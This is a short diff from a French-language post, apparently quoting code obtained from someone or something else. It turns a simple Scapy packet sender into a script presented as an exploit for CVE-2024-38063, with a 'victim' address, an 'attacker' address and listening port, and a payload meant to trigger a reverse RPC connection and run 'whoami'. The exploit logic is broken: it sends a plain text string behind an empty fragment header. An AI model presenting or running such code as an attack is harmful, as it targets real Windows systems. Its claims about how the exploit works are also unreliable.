@@ -65,20 +65,25 @@ Voici les codes qu'il ma sortie :
 ```python
 from scapy.all import *
 
-# Adresse IPv6 de la machine cible
-target_ip = "fe80::1"  # Remplacer avec l'IPv6 de la cible
-target_port = 9000  # Port où le serveur écoute
+# Adresse IPv6 de la victime
+victim_ip = "fe80::1"  # Remplace par l'IP de test
+victim_port = 135  # Port RPC (habituel pour Windows)
 
-# Commande à exécuter (exemple : "whoami")
-cmd = "whoami"
+# Adresse IPv6 de l'attaquant (où la victime se connectera)
+attacker_ip = "fe80::2"  # Remplace par ton IP IPv6
+attacker_port = 4444  # Port d'écoute RPC sur l'attaquant
 
-# Création d'un paquet IPv6 contenant la commande
-malicious_packet = IPv6(dst=target_ip) / UDP(dport=target_port) / Raw(load=cmd)
+# Charge utile malveillante exploitant la CVE-2024-38063
+payload = f"RPC_CONNECT {attacker_ip}:{attacker_port} && whoami"
+
+# Création du paquet IPv6 avec fragmentation malveillante (exploitation CVE)
+malicious_packet = IPv6(dst=victim_ip) / IPv6ExtHdrFragment() / Raw(load=payload)
 
 # Envoi du paquet
 send(malicious_packet)
 
-print(f"Paquet IPv6 contenant la commande '{cmd}' envoyé à {target_ip}")
+print(f"Exploit envoyé vers {victim_ip} pour établir une connexion RPC inversée")
+
 
 
 
